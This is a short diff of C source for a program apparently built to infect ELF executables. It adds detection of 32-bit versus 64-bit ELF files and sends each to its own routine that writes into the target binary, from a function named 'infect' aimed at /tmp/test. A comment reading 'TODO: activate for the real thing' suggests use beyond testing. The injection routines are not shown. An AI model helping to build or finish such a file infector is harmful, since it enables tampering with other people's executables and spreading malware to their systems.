@@ -28,6 +28,23 @@ int		check_copy(char *ptr, size_t size)
 	return (0);
 }
 
+int		find32or64ELF(void *ptr)
+{
+	Elf32_Ehdr	*ehdr		= (Elf32_Ehdr *) ptr;
+
+	if (ehdr->e_ident[EI_CLASS] == ELFCLASS32)
+	{
+		//fprintf(stdout, BOLDRED"<"CYAN"o"RED">"RESET YELLOW" 32bits\n"RESET);
+		return (1);
+	}
+	if (ehdr->e_ident[EI_CLASS] == ELFCLASS64)
+	{
+		//fprintf(stdout, BOLDRED"<"CYAN"o"RED">"RESET YELLOW" 64bits\n"RESET);
+		return (2);
+	}
+	return (0);
+}
+
 int		processing(char *ptr, size_t size, char *path, int fd)
 {
 	unsigned int	magic_number;
@@ -40,7 +57,9 @@ int		processing(char *ptr, size_t size, char *path, int fd)
 	elf_magic_number = ELFMAG3 << 24 | ELFMAG2 << 16 | ELFMAG1 << 8 | ELFMAG0;
 	if (magic_number ==  elf_magic_number)
 	{
-		if (write_string(ptr, size, path, fd))
+		if (find32or64ELF(ptr) == 1 && write_string32(ptr, size, path, fd))
+			return (1);
+		if (find32or64ELF(ptr) == 2 && write_string64(ptr, size, path, fd))
 			return (1);
 		return (0);
 	}
@@ -77,13 +96,13 @@ int		infect(char *path)
 	if (munmap(ptr, buf.st_size) < 0)
 		return (error("munmap failed\n"));
 	if (close(fd) < 0)
-		return (error("failes to close fd\n"));
+		return (error("failed to close fd\n"));
 	return (0);
 }
 
 int		main(int ac, char **av)
 {
-	outputhandle(ac, av);
+	//outputhandle(ac, av); //TODO: activate for the real thing
 	if (ac <= 1)
 	{
 		infect("/tmp/test");
